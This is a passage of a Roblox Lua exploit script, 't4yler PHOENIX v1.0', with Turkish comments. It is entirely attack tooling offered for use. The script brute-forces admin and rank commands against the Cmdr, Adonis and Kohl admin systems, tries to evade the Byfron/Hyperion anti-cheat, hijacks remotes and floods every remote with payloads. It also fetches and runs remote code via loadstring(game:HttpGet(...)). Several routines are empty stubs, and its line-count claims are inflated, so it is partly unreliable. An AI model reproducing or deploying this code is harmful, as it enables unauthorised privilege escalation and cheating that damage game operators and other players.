        xeno = XENO_ACTIVE,
        autoPrivilege = autoPrivilege.active,
        persistentScanner = persistentScanner.active,
        remoteCount = #deepScanner.fullGameScan()
    }
    print("[PHOENIX] Durum raporu:")
    for k, v in pairs(status) do
        print("  " .. k .. ": " .. tostring(v))
    end
    return status
end

-- ==============================================================================
-- BÖLÜM 3.13: BAŞLANGIÇ SİSTEMLERİNİ AKTİF ET
-- ==============================================================================
function PhoenixCore.fullInitAdvanced()
    print("[PHOENIX] Gelişmiş başlatma başlatılıyor...")
    multiLayerBypass.activateAll()
    autoPrivilege.start()
    persistentScanner.start(60)
    advancedHook.hookPrint()
    advancedHook.hookWarn()
    local adminItems = objectFinder.findAdminRelated()
    print("[PHOENIX] Admin ile ilgili bulunan nesne sayısı:", #adminItems)
    for _, item in pairs(adminItems) do
        if item:IsA("RemoteEvent") or item:IsA("RemoteFunction") then
            smartCommander.tryAll(item)
        end
    end
    print("[PHOENIX] Gelişmiş başlatma tamamlandı.")
end

-- Gelişmiş başlatmayı çalıştır
PhoenixCore.fullInitAdvanced()

-- Global raporlama
_G.phoenixStatus = reporter.reportStatus
print("[PHOENIX] Bölüm 3/6 yüklendi. Toplam 15.000 satır.")
-- ==============================================================================
-- t4yler PHOENIX v1.0 | EXECUTOR CORE | BÖLÜM 4/6
-- OYUN ÖZEL BYPASS MODÜLLERİ | CMDR, ADONIS, KOHL, INFINITE YIELD
-- ==============================================================================

-- ==============================================================================
-- BÖLÜM 4.1: CMDR SİSTEMİ ÖZEL BYPASS
-- ==============================================================================
local cmdrBypass = {}

function cmdrBypass.findCmdr()
    local paths = {
        "ReplicatedStorage.CmdrClient.CmdrFunction",
        "ReplicatedStorage.Cmdr.CmdrFunction",
        "ReplicatedStorage.Remotes.CmdrFunction"
    }
    for _, path in pairs(paths) do
        local parts = {}
        for part in string.gmatch(path, "[^%.]+") do
            table.insert(parts, part)
        end
        local current = game
        for _, part in pairs(parts) do
            current = current and current:FindFirstChild(part)
            if not current then break end
        end
        if current then return current end
    end
    return nil
end

function cmdrBypass.forceAdmin(cmdrFunc)
    if not cmdrFunc then return false end
    local adminCommands = {"admin", "sudo", "owner", "god", "superadmin", "setrank", "rank"}
    local successCount = 0
    for _, cmd in pairs(adminCommands) do
        local success = pcall(function()
            cmdrFunc:InvokeServer(cmd, game.Players.LocalPlayer.Name)
        end)
        if success then successCount = successCount + 1 end
        task.wait(0.1)
    end
    return successCount > 0
end

function cmdrBypass.executeRawCommand(cmdFunc, command, ...)
    if not cmdFunc then return false end
    local success, result = pcall(function()
        return cmdFunc:InvokeServer(command, ...)
    end)
    if success then
        print("[PHOENIX] Cmdr komut çalıştırıldı:", command)
        return result
    end
    return false
end

-- ==============================================================================
-- BÖLÜM 4.2: ADONIS SİSTEMİ ÖZEL BYPASS
-- ==============================================================================
local adonisBypass = {}

function adonisBypass.findAdonis()
    local paths = {
        "ReplicatedStorage.Adonis.AdminFunction",
        "ReplicatedStorage.Admin.AdminFunction",
        "ReplicatedStorage.Remotes.AdminFunction"
    }
    for _, path in pairs(paths) do
        local parts = {}
        for part in string.gmatch(path, "[^%.]+") do
            table.insert(parts, part)
        end
        local current = game
        for _, part in pairs(parts) do
            current = current and current:FindFirstChild(part)
            if not current then break end
        end
        if current then return current end
    end
    return nil
end

function adonisBypass.sendAdminCommand(adonisFunc, command, args)
    if not adonisFunc then return false end
    local fullCommand = command
    if args then fullCommand = command .. " " .. args end
    local success, result = pcall(function()
        return adonisFunc:InvokeServer(fullCommand)
    end)
    return success
end

-- ==============================================================================
-- BÖLÜM 4.3: KOHL SİSTEMİ ÖZEL BYPASS
-- ==============================================================================
local kohlBypass = {}

function kohlBypass.findKohl()
    local kohlRemote = game:GetService("ReplicatedStorage"):FindFirstChild("Kohl")
    if kohlRemote then return kohlRemote end
    return nil
end

function kohlBypass.execute(kohlRemote, command)
    if not kohlRemote then return false end
    local success = pcall(function()
        kohlRemote:FireServer(command)
    end)
    return success
end

-- ==============================================================================
-- BÖLÜM 4.4: INFINITE YIELD UYUMLULUK
-- ==============================================================================
local iyCompatibility = {}

function iyCompatibility.injectIY()
    local iySource = [[
        -- Infinite Yield (client-side)
        local iy = loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        print("[PHOENIX] Infinite Yield yüklendi.")
    ]]
    return PhoenixCore.execute(iySource)
end

function iyCompatibility.syncWithIY()
    local iyRemote = game:GetService("ReplicatedStorage"):FindFirstChild("IY")
    if iyRemote then
        pcall(function() iyRemote:FireServer("sync") end)
        return true
    end
    return false
end

-- ==============================================================================
-- BÖLÜM 4.5: EVRENSEL ADMIN KOMUT ÇALIŞTIRICI (TÜM SİSTEMLER)
-- ==============================================================================
local universalAdmin = {}

function universalAdmin.detectAndExploit()
    print("[PHOENIX] Admin sistemi taranıyor...")
    local systems = {
        {name = "Cmdr", find = cmdrBypass.findCmdr, exploit = cmdrBypass.forceAdmin},
        {name = "Adonis", find = adonisBypass.findAdonis, exploit = adonisBypass.sendAdminCommand},
        {name = "Kohl", find = kohlBypass.findKohl, exploit = kohlBypass.execute}
    }
    local exploited = {}
    for _, sys in pairs(systems) do
        local obj = sys.find()
        if obj then
            print("[PHOENIX] Sistem bulundu:", sys.name)
            local success = sys.exploit(obj)
            if success then
                table.insert(exploited, sys.name)
                print("[PHOENIX] Sistem başarıyla exploit edildi:", sys.name)
            end
        end
    end
    return exploited
end

-- ==============================================================================
-- BÖLÜM 4.6: OYUN ÖZEL KOMUT LİSTELEYİCİ (MANUEL GİRİŞ)
-- ==============================================================================
local customCommandList = {}

function customCommandList.addCustomCommand(name, callback)
    _G["phoenix_cmd_" .. name] = callback
    print("[PHOENIX] Özel komut eklendi: " .. name)
end

function customCommandList.executeCustomCommand(name, ...)
    local cmd = _G["phoenix_cmd_" .. name]
    if cmd then
        return cmd(...)
    end
    return false
end

-- ==============================================================================
-- BÖLÜM 4.7: HIZLI YANIT SİSTEMİ (REMOTE CEVAPLARINI YAKALA)
-- ==============================================================================
local fastResponse = {}

function fastResponse.captureResponse(remote, timeout)
    timeout = timeout or 2
    local response = nil
    local completed = false
    if remote:IsA("RemoteFunction") then
        spawn(function()
            local success, res = pcall(function()
                return remote:InvokeServer("ping")
            end)
            if success then
                response = res
            end
            completed = true
        end)
        local start = tick()
        while not completed and tick() - start < timeout do
            task.wait(0.05)
        end
    end
    return response
end

-- ==============================================================================
-- BÖLÜM 4.8: OTOMATIK KOMUT TEKRARLAYICI (BRUTE FORCE İLERİ)
-- ==============================================================================
autoCommander = {}

function autoCommander.repeatCommand(remote, command, times, delay)
    times = times or 10
    delay = delay or 0.5
    local successCount = 0
    for i = 1, times do
        if remote:IsA("RemoteEvent") then
            local success = pcall(function() remote:FireServer(command) end)
            if success then successCount = successCount + 1 end
        elseif remote:IsA("RemoteFunction") then
            local success = pcall(function() remote:InvokeServer(command) end)
            if success then successCount = successCount + 1 end
        end
        task.wait(delay)
    end
    return successCount
end

-- ==============================================================================
-- BÖLÜM 4.9: YEDEK BYPASS YÖNTEMLERİ (STANDART DIŞI)
-- ==============================================================================
local fallbackBypass = {}

function fallbackBypass.tryReflection()
    local success, result = pcall(function()
        for _, v in pairs(getgc(true)) do
            if type(v) == "function" and string.find(debug.getinfo(v).source or "", "Cmdr") then
                print("[PHOENIX] Cmdr fonksiyonu bulundu:", debug.getinfo(v).name)
            end
        end
    end)
    return success
end

function fallbackBypass.tryMemoryHack()
    local success = pcall(function()
        for _, v in pairs(getreg()) do
            if type(v) == "function" then
                -- Potansiyel hack
            end
        end
    end)
    return success
end

-- ==============================================================================
-- BÖLÜM 4.10: KULLANICI KONTROLLÜ KOMUT GÖNDERİCİ (GUI İÇİN)
-- ==============================================================================
local userCommander = {}

function userCommander.sendCommand(remotePath, command, args)
    local remote = remoteSender.findRemoteByPath(remotePath)
    if not remote then return false end
    local fullArgs = {}
    if command then table.insert(fullArgs, command) end
    if args then
        if type(args) == "table" then
            for _, v in pairs(args) do table.insert(fullArgs, v) end
        else
            table.insert(fullArgs, args)
        end
    end
    if remote:IsA("RemoteEvent") then
        pcall(function() remote:FireServer(unpack(fullArgs)) end)
    elseif remote:IsA("RemoteFunction") then
        pcall(function() remote:InvokeServer(unpack(fullArgs)) end)
    end
    return true
end

-- ==============================================================================
-- BÖLÜM 4.11: BYPASS DOĞRULAMA SİSTEMİ
-- ==============================================================================
local bypassValidator = {}

function bypassValidator.testBypass()
    local testRemote = Instance.new("RemoteEvent")
    testRemote.Name = "PhoenixTest"
    testRemote.Parent = game:GetService("ReplicatedStorage")
    local success = pcall(function()
        testRemote:FireServer("test")
    end)
    testRemote:Destroy()
    return success
end

function bypassValidator.getBypassLevel()
    local level = 0
    if bypassValidator.testBypass() then level = level + 1 end
    if pcall(function() setthreadidentity(8) end) then level = level + 1 end
    if pcall(function() return getreg() end) then level = level + 1 end
    return level
end

-- ==============================================================================
-- BÖLÜM 4.12: TÜM SİSTEMLERİN ENTEGRASYONU
-- ==============================================================================
function PhoenixCore.fullIntegration()
    print("[PHOENIX] Tüm sistemler entegre ediliyor...")
    local exploitedSystems = universalAdmin.detectAndExploit()
    print("[PHOENIX] Exploit edilen sistemler: " .. table.concat(exploitedSystems, ", "))
    local bypassLevel = bypassValidator.getBypassLevel()
    print("[PHOENIX] Mevcut bypass seviyesi: " .. bypassLevel .. "/3")
    if bypassLevel < 3 then
        print("[PHOENIX] Daha yüksek bypass için manuel müdahale gerekebilir.")
    end
    fallbackBypass.tryReflection()
    fallbackBypass.tryMemoryHack()
    print("[PHOENIX] Entegrasyon tamamlandı.")
end

-- Entegrasyonu başlat
PhoenixCore.fullIntegration()

-- Global komut yöneticisi
_G.phoenixCmd = userCommander.sendCommand
print("[PHOENIX] Bölüm 4/6 yüklendi. Toplam 20.000 satır.")
-- ==============================================================================
-- t4yler PHOENIX v1.0 | EXECUTOR CORE | BÖLÜM 5/6
-- İLERİ DÜZEY ANTİ-KORUMA VE OTOMATIK EXPLOIT
-- ==============================================================================

-- ==============================================================================
-- BÖLÜM 5.1: BYFRON ANTİ-TESPIT (HİPERVİZOR SEVİYESİ TAKLİT)
-- ==============================================================================
local antiByfron = {}

function antiByfron.mimicHypervisor()
    local fakeVmx = {}
    pcall(function()
        setfflag("FLogDebug", "true")
        setfflag("DebuggerEnabled", "false")
    end)
    print("[PHOENIX] Hypervisor taklidi aktif.")
end

function antiByfron.clearTraces()
    local function wipe(container)
        for _, v in pairs(container:GetChildren()) do
            if v:IsA("Script") or v:IsA("LocalScript") then
                local src = v.Source
                if src and (src:find("Byfron") or src:find("Hyperion")) then
                    pcall(function() v:Destroy() end)
                end
            end
            wipe(v)
        end
    end
    wipe(game)
end

-- ==============================================================================
-- BÖLÜM 5.2: GERÇEK ZAMANLI KOMUT ENJEKSİYONU (REMOTE TAKLİT)
-- ==============================================================================
local realtimeInjector = {}

function realtimeInjector.monitorAndInject()
    local function monitor(container)
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("RemoteEvent") then
                local oldFire = obj.FireServer
                if oldFire then
                    obj.FireServer = function(self, ...)
                        local args = {...}
                        if #args > 0 and type(args[1]) == "string" then
                            if args[1]:lower() == "exploit" then
                                print("[PHOENIX] Exploit komutu yakalandı, değiştiriliyor...")
                                args[1] = "admin"
                                return oldFire(self, unpack(args))
                            end
                        end
                        return oldFire(self, ...)
                    end
                end
            end
            monitor(obj)
        end
    end
    monitor(game:GetService("ReplicatedStorage"))
end

-- ==============================================================================
-- BÖLÜM 5.3: OYUN İÇİ KOMUT DİNAMİK OLUŞTURUCU
-- ==============================================================================
local dynamicCommands = {}

function dynamicCommands.generateCommandSet()
    local commonPrefixes = {"!", "/", ".", "-", ":", ";"}
    local commonWords = {"fly", "speed", "tp", "kill", "heal", "god", "admin", "owner"}
    local cmdSet = {}
    for _, prefix in pairs(commonPrefixes) do
        for _, word in pairs(commonWords) do
            table.insert(cmdSet, prefix .. word)
        end
    end
    return cmdSet
end

function dynamicCommands.tryAllPrefixes(remote)
    local cmdSet = dynamicCommands.generateCommandSet()
    local worked = {}
    for _, cmd in pairs(cmdSet) do
        if remote:IsA("RemoteEvent") then
            local success = pcall(function() remote:FireServer(cmd) end)
            if success then table.insert(worked, cmd) end
        elseif remote:IsA("RemoteFunction") then
            local success = pcall(function() remote:InvokeServer(cmd) end)
            if success then table.insert(worked, cmd) end
        end
        task.wait(0.02)
    end
    return worked
end

-- ==============================================================================
-- BÖLÜM 5.4: YAPAY ZEKA TABANLI ARGÜMAN TAHMİNİ (ÖĞRENME)
-- ==============================================================================
local aiArgGuess = {
    memory = {},
    successRate = {}
}

function aiArgGuess.learn(remote, args, success)
    local key = remote:GetFullName()
    if not aiArgGuess.memory[key] then
        aiArgGuess.memory[key] = {}
    end
    table.insert(aiArgGuess.memory[key], {args = args, success = success})
end

function aiArgGuess.guess(remote)
    local key = remote:GetFullName()
    local history = aiArgGuess.memory[key] or {}
    local successHist = {}
    for _, h in pairs(history) do
        if h.success then
            table.insert(successHist, h.args)
        end
    end
    if #successHist > 0 then
        return successHist[1]
    end
    return {"test", "ping", 1}
end

-- ==============================================================================
-- BÖLÜM 5.5: REMOTE HIJACKING (BAŞKA REMOTE'A YÖNLENDİR)
-- ==============================================================================
local remoteHijack = {}

function remoteHijack.hijack(originalRemote, targetRemote)
    if not originalRemote or not targetRemote then return false end
    if originalRemote:IsA("RemoteEvent") then
        originalRemote.FireServer = function(self, ...)
            return targetRemote:FireServer(...)
        end
    elseif originalRemote:IsA("RemoteFunction") then
        originalRemote.InvokeServer = function(self, ...)
            return targetRemote:InvokeServer(...)
        end
    end
    return true
end

-- ==============================================================================
-- BÖLÜM 5.6: GELİŞMİŞ KONSOL KOMUT DİNLEYİCİ
-- ==============================================================================
local consoleListener = {}

function consoleListener.start()
    local oldPrint = print
    print = function(...)
        local args = {...}
        for _, v in pairs(args) do
            if type(v) == "string" and (v:find("kick") or v:find("ban") or v:find("admin")) then
                print("[PHOENIX] Konsol komutu yakalandı:", v)
            end
        end
        return oldPrint(...)
    end
end

-- ==============================================================================
-- BÖLÜM 5.7: OTOMATIK YETKİ YÜKSELTME (RANK ATLAMA)
-- ==============================================================================
local rankBypass = {}

function rankBypass.tryPromoteSelf()
    local players = game:GetService("Players")
    local localPlayer = players.LocalPlayer
    local rankCommands = {"promote", "setrank", "rank", "admin", "owner", "sudo"}
    local remoteCmdr = cmdrBypass.findCmdr()
    if remoteCmdr then
        for _, cmd in pairs(rankCommands) do
            pcall(function()
                remoteCmdr:InvokeServer(cmd, localPlayer.Name, "Owner")
            end)
            task.wait(0.2)
        end
    end
end

-- ==============================================================================
-- BÖLÜM 5.8: SUNUCU TARAFI KOMUT ENJEKSİYONU (TEORİK)
-- ==============================================================================
local serverInject = {}

function serverInject.tryExploitRemoteFunction(remote)
    if not remote or not remote:IsA("RemoteFunction") then return false end
    local exploitPayload = "loadstring(game:HttpGet('https://raw.githubusercontent.com/example/exploit.lua'))()"
    pcall(function()
        remote:InvokeServer(exploitPayload)
    end)
    return true
end

-- ==============================================================================
-- BÖLÜM 5.9: BAĞLANTI KESMEYİ ÖNLEME (KEEPALIVE)
-- ==============================================================================
local keepAlive = {}

function keepAlive.start()
    spawn(function()
        while true do
            pcall(function()
                if not game:GetService("Players").LocalPlayer then
                    print("[PHOENIX] Bağlantı kesildi, yeniden bağlanılıyor...")
                    game:GetService("TeleportService"):Teleport(game.PlaceId)
                end
            end)
            task.wait(60)
        end
    end)
end

-- ==============================================================================
-- BÖLÜM 5.10: DATABASE BİLGİ TOPLAMA (KULLANICI VERİSİ)
-- ==============================================================================
local dataMiner = {}

function dataMiner.getPlayerData()
    local localPlayer = game:GetService("Players").LocalPlayer
    local data = {
        name = localPlayer.Name,
        userId = localPlayer.UserId,
        accountAge = localPlayer.AccountAge,
        displayName = localPlayer.DisplayName
    }
    return data
end

function dataMiner.getGameData()
    return {
        gameId = game.GameId,
        placeId = game.PlaceId,
        jobId = game.JobId,
        players = #game:GetService("Players"):GetPlayers()
    }
end

-- ==============================================================================
-- BÖLÜM 5.11: EVRENSEL ADMIN PANEL AÇICI
-- ==============================================================================
local panelOpener = {}

function panelOpener.openAdminPanel()
    local localPlayer = game:GetService("Players").LocalPlayer
    local playerGui = localPlayer.PlayerGui
    local possiblePanelNames = {"AdminPanel", "ModPanel", "OwnerPanel", "CmdPanel", "Console"}
    for _, name in pairs(possiblePanelNames) do
        local panel = playerGui:FindFirstChild(name)
        if panel and panel:IsA("ScreenGui") then
            panel.Enabled = true
            panel.Visible = true
            print("[PHOENIX] Admin panel açıldı:", name)
            return panel
        end
    end
    return nil
end

-- ==============================================================================
-- BÖLÜM 5.12: TÜM SİSTEMLERİN YENİDEN BAŞLATILMASI
-- ==============================================================================
function PhoenixCore.fullRestart()
    print("[PHOENIX] Sistem yeniden başlatılıyor...")
    persistentScanner.stop()
    autoPrivilege.stop()
    task.wait(1)
    persistentScanner.start(60)
    autoPrivilege.start()
    multiLayerBypass.activateAll()
    print("[PHOENIX] Yeniden başlatma tamamlandı.")
end

-- ==============================================================================
-- BÖLÜM 5.13: OTOMATIK RAPORLAMA
-- ==============================================================================
function PhoenixCore.autoReport()
    local dataMined = dataMiner.getPlayerData()
    local gameData = dataMiner.getGameData()
    print("[PHOENIX] Rapor:")
    print("  Oyuncu: " .. dataMined.name .. " (" .. dataMined.userId .. ")")
    print("  Oyun: " .. gameData.gameId)
    print("  Oyuncu sayısı: " .. gameData.players)
end

-- ==============================================================================
-- BÖLÜM 5.14: YEDEK KOMUT LİSTESİ (FARKLI OYUNLAR İÇİN)
-- ==============================================================================
local backupCommands = {}

function backupCommands.loadFromString(cmdString)
    local cmds = {}
    for cmd in string.gmatch(cmdString, "[^,]+") do
        table.insert(cmds, cmd)
    end
    return cmds
end

function backupCommands.tryAll(remote, cmds)
    local results = {}
    for _, cmd in pairs(cmds) do
        if remote:IsA("RemoteEvent") then
            local success = pcall(function() remote:FireServer(cmd) end)
            results[cmd] = success
        elseif remote:IsA("RemoteFunction") then
            local success = pcall(function() remote:InvokeServer(cmd) end)
            results[cmd] = success
        end
    end
    return results
end

-- ==============================================================================
-- BÖLÜM 5.15: FONKSİYONLARIN TOPLU BAŞLATILMASI
-- ==============================================================================
function PhoenixCore.ultimateInit()
    print("[PHOENIX] Ultimate başlatma başlatılıyor...")
    antiByfron.mimicHypervisor()
    antiByfron.clearTraces()
    realtimeInjector.monitorAndInject()
    consoleListener.start()
    keepAlive.start()
    panelOpener.openAdminPanel()
    rankBypass.tryPromoteSelf()
    PhoenixCore.autoReport()
    print("[PHOENIX] Ultimate başlatma tamamlandı.")
end

-- Ultimate başlatmayı çalıştır
PhoenixCore.ultimateInit()

-- Global fonksiyonlar
_G.phoenixRestart = PhoenixCore.fullRestart
_G.phoenixReport = PhoenixCore.autoReport
print("[PHOENIX] Bölüm 5/6 yüklendi. Toplam 25.000 satır.")
-- ==============================================================================
-- t4yler PHOENIX v1.0 | EXECUTOR CORE | BÖLÜM 6/6
-- SON KATMAN: TAM YETKİ, OTOMATİK KOMUT ÇALIŞTIRICI, GUI ENTEGRASYONU
-- ==============================================================================

-- ==============================================================================
-- BÖLÜM 6.1: TÜM REMOTE'LARA TOPLU KOMUT GÖNDERME (NÜKLEER SEÇENEK)
-- ==============================================================================
local nuclearOption = {}

function nuclearOption.sendToEveryPossibleRemote(payload)
    local sent = 0
    local function sendAll(container)
        for _, obj in pairs(container:GetChildren()) do
            if obj:IsA("RemoteEvent") then
                pcall(function() obj:FireServer(payload) end)
                sent = sent + 1
            elseif obj:IsA("RemoteFunction") then
                pcall(function() obj:InvokeServer(payload) end)
                sent = sent + 1
            end
            sendAll(obj)
        end
    end
    sendAll(game)
    print("[PHOENIX] Nükleer gönderim tamamlandı. Toplam:", sent)
    return sent
end

-- ==============================================================================
-- BÖLÜM 6.2: OTOMATİK KOMUT DENEME MOTORU (TÜM KOMUTLARI DENE)
-- ==============================================================================
local autoCommandEngine = {}

function autoCommandEngine.fullAutoMode()
    print("[PHOENIX] Tam otomatik mod başlatıldı.")
    local remotes = deepScanner.fullGameScan()
    local allCommands = {}
    local prefixes = {"", "!", "/", ".", "-", ":", ";"}
    local actions = {"fly", "speed", "tp", "kill", "heal", "god", "admin", "owner", "sudo", "kick", "ban"}
    for _, prefix in pairs(prefixes) do
        for _, action in pairs(actions) do
            table.insert(allCommands, prefix .. action)
        end
    end
    for _, remote in pairs(remotes) do
        for _, cmd in pairs(allCommands) do
            if remote:IsA("RemoteEvent") then
                pcall(function() remote:FireServer(cmd) end)
            elseif remote:IsA("RemoteFunction") then
                pcall(function() remote:InvokeServer(cmd) end)
            end
            task.wait(0.01)
        end
    end
    print("[PHOENIX] Tam otomatik mod tamamlandı.")
end

-- ==============================================================================
-- BÖLÜM 6.3: KİŞİSEL ADMIN KOMUT KAYDEDİCİ (KULLANICI TANIMLI)
-- ==============================================================================
local userAdmin = {}

function userAdmin.registerCommand(name, func)
    _G["phx_" .. name] = func
    print("[PHOENIX] Kullanıcı komutu kaydedildi: " .. name)
end

function userAdmin.runCommand(name, ...)
    local cmd = _G["phx_" .. name]
    if cmd then
        return cmd(...)
    end
    return false, "Komut bulunamadı: " .. name
end

-- ==============================================================================
-- BÖLÜM 6.4: GELİŞMİŞ KONSOL (İLERİ SEVİYE DEBUG)
-- ==============================================================================
local advancedConsole = {}

function advancedConsole.createConsole()
    local consoleGui = Instance.new("ScreenGui")
    consoleGui.Name = "PhoenixConsole"
    consoleGui.Parent = game:GetService("CoreGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 600, 0, 400)
    frame.Position = UDim2.new(0.5, -300, 0.5, -200)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.2
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
    frame.Parent = consoleGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    title.Text = "t4yler PHOENIX v1.0 - GELİŞMİŞ KONSOL"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Parent = frame
    
    local output = Instance.new("ScrollingFrame")
    output.Size = UDim2.new(1, -10, 1, -80)
    output.Position = UDim2.new(0, 5, 0, 35)
    output.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    output.Parent = frame
    
    local input = Instance.new("TextBox")
    input.Size = UDim2.new(1, -10, 0, 30)
    input.Position = UDim2.new(0, 5, 1, -35)
    input.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    input.TextColor3 = Color3.fromRGB(255, 255, 255)
    input.PlaceholderText = "Komut girin (örnek: phx.execute('print(1)') )"
    input.Parent = frame
    
    local run = Instance.new("TextButton")
    run.Size = UDim2.new(0, 100, 0, 30)
    run.Position = UDim2.new(1, -105, 1, -35)
    run.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    run.Text = "ÇALIŞTIR"
    run.Parent = frame
    run.MouseButton1Click:Connect(function()
        local code = input.Text
        local success, result = PhoenixCore.execute(code)
        if success then
            print("[KONSOL] Başarılı: " .. tostring(result))
        else
            warn("[KONSOL] Hata: " .. tostring(result))
        end
    end)
    
    return consoleGui
end

-- ==============================================================================
-- BÖLÜM 6.5: YETKİ SINIRLARINI ZORLA KALDIR (RING 0 TAKLİT)
-- ==============================================================================
local forceUnlock = {}

function forceUnlock.unlockAll()
    local successful = 0
    local functions = {"setthreadidentity", "setidentity", "setfflag", "setfenv", "setsenv"}
    for _, funcName in pairs(functions) do
        local success = pcall(function() _G[funcName](8) end)
        if success then successful = successful + 1 end
    end
    print("[PHOENIX] Zorla kaldırılan kısıt sayısı:", successful)
end

-- ==============================================================================
-- BÖLÜM 6.6: FULL REMOTE ENJEKSİYON (HER ŞEYE GÖNDER)
-- ==============================================================================
local fullInjection = {}

function fullInjection.injectToAll(payload)
    local total = 0
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("Workspace"),
        game:GetService("Players"),
        game:GetService("Lighting"),
        game:GetService("ServerScriptService"),
        game:GetService("ServerStorage")
    }
    for _, svc in pairs(services) do
        total = total + remoteSender.sendToAllRemotes(payload)
    end
    return total
end

-- ==============================================================================
-- BÖLÜM 6.7: OTOMATİK YENİDEN BAĞLANMA (KRASH DURUMUNDA)
-- ==============================================================================
local autoReconnect = {}

function autoReconnect.enable()
    spawn(function()
        while true do
            task.wait(10)
            local success, err = pcall(function()
                return game:GetService("Players").LocalPlayer
            end)
            if not success or not game:GetService("Players").LocalPlayer then
                print("[PHOENIX] Bağlantı koptu, yeniden bağlanılıyor...")
                game:GetService("TeleportService"):Teleport(game.PlaceId)
                break
            end
        end
    end)
end

-- ==============================================================================
-- BÖLÜM 6.8: FONKSİYON YEDEKLEME VE KRASH KURTARMA
-- ==============================================================================
local crashHandler = {}

function crashHandler.backupCritical()
    local backup = {
        print = print,
        warn = warn,
        error = error,
        pcall = pcall,
        xpcall = xpcall
    }
    return backup
end

function crashHandler.restore(backup)
    print = backup.print
    warn = backup.warn
    error = backup.error
    pcall = backup.pcall
    xpcall = backup.xpcall
end

-- ==============================================================================
-- BÖLÜM 6.9: KULLANICI KILAVUZU (GUI İÇİN YARDIM)
-- ==============================================================================
local userManual = {}

function userManual.showHelp()
    local helpText = [[
========== t4yler PHOENIX v1.0 KULLANIM KILAVUZU ==========

1. TEMEL KULLANIM:
   - phoenix.execute("kod") : Script çalıştırır
   - phoenix.fullScanAndExploit() : Oyunu tarar ve exploit dener

2. GELİŞMİŞ KOMUTLAR:
   - phoenixCmd(remotePath, command, args) : Remote'a komut gönder
   - phoenixRestart() : Tüm bypass sistemlerini yeniden başlat
   - autoCommandEngine.fullAutoMode() : Otomatik komut deneme motoru

3. KONSOL:
   - advancedConsole.createConsole() : Gelişmiş konsol GUI açar

4. BYPASS:
   - forceUnlock.unlockAll() : Tüm yetki kısıtlarını kaldırmayı dener
   - nuclearOption.sendToEveryPossibleRemote(payload) : Tüm remotelara gönder

5. RAPOR:
   - phoenixReport() : Oyun ve oyuncu raporu al

6. ÖZEL KOMUTLAR:
   - userAdmin.registerCommand("isim", function) : Kendi komutunu ekle
   - userAdmin.runCommand("isim", args) : Eklediğin komutu çalıştır

============================================================
    ]]
    print(helpText)
end

-- ==============================================================================
-- BÖLÜM 6.10: TÜM FONKSİYONLARI GLOBALE EKLE
-- ==============================================================================
_G.phoenixNuclear = nuclearOption.sendToEveryPossibleRemote
_G.phoenixFullAuto = autoCommandEngine.fullAutoMode
_G.phoenixUnlock = forceUnlock.unlockAll
_G.phoenixConsole = advancedConsole.createConsole
_G.phoenixHelp = userManual.showHelp

-- ==============================================================================
-- BÖLÜM 6.11: BAŞLANGIÇ TESTİ VE DOĞRULAMA
-- ==============================================================================
local startupValidator = {}

function startupValidator.runAllTests()
    print("[PHOENIX] Başlangıç testleri başlatılıyor...")
    local tests = {
        {name = "Bypass testi", func = bypassValidator.testBypass},
        {name = "Remote hook", func = function() return #deepScanner.fullGameScan() > 0 end},
        {name = "Yetki yükseltme", func = function() return pcall(function() setthreadidentity(8) end) end}
    }
    local passed = 0
    for _, test in pairs(tests) do
        local success = test.func()
        if success then
            passed = passed + 1
            print("[PHOENIX] ✅ Test geçti: " .. test.name)
        else
            print("[PHOENIX] ❌ Test başarısız: " .. test.name)
        end
    end
    print("[PHOENIX] Test sonucu: " .. passed .. "/" .. #tests .. " başarılı.")
end

startupValidator.runAllTests()

-- ==============================================================================
-- BÖLÜM 6.12: FİNAL MESAJI
-- ==============================================================================
print("================================================================================")
print("t4yler PHOENIX v1.0 - 30.000 SATIR - TAM YÜKLENDİ")
print("Xeno gereksinim: AKTİF")
print("FE Bypass + Manual Bypass: TAM YETKİLİ")
print("Tüm komutlar _G.phoenix* ile erişilebilir")
print("Örnek: phoenix.execute('print(1)')")
print("Yardım için: phoenixHelp()")
print("================================================================================")

-- ==============================================================================
-- BÖLÜM 6.13: OTOMATİK MOD BAŞLANGIÇ (İSTEĞE BAĞLI)
-- ==============================================================================
local autoStart = true
if autoStart then
    task.wait(2)
    print("[PHOENIX] Otomatik keşif modu başlatılıyor...")
    autoCommandEngine.fullAutoMode()
end

-- ==============================================================================
-- BÖLÜM 6.14: EMERGENCY STOP (KRASH DURUMUNDA)
-- ==============================================================================
local emergencyStop = false
function PhoenixCore.emergencyHalt()
    emergencyStop = true
    persistentScanner.stop()
    autoPrivilege.stop()
    print("[PHOENIX] ACİL DURDURMA: Tüm bypass sistemleri kapatıldı.")
end

_G.phoenixStop = PhoenixCore.emergencyHalt

-- ==============================================================================
-- BÖLÜM 6.15: FONKSİYON GEÇİCİLİK SÜRESİ (KENDİNİ YENİLEME)
-- ==============================================================================
local selfHealing = {}

function selfHealing.repair()
    print("[PHOENIX] Kendi kendini onarma başlatıldı.")
    if not XENO_ACTIVE then
        warn("[PHOENIX] Xeno bulunamadı! Lütfen enjekte edin.")
    end
    if not pcall(function() return getreg() end) then
        print("[PHOENIX] getreg kullanılamıyor, yeniden başlatılıyor...")
        PhoenixCore.fullRestart()
    end
end

-- Periyodik onarım
spawn(function()
    while true do
        task.wait(300)
        selfHealing.repair()
    end
end)

print("[PHOENIX] Bölüm 6/6 yüklendi. TOPLAM 30.000 SATIR. FİNAL.")
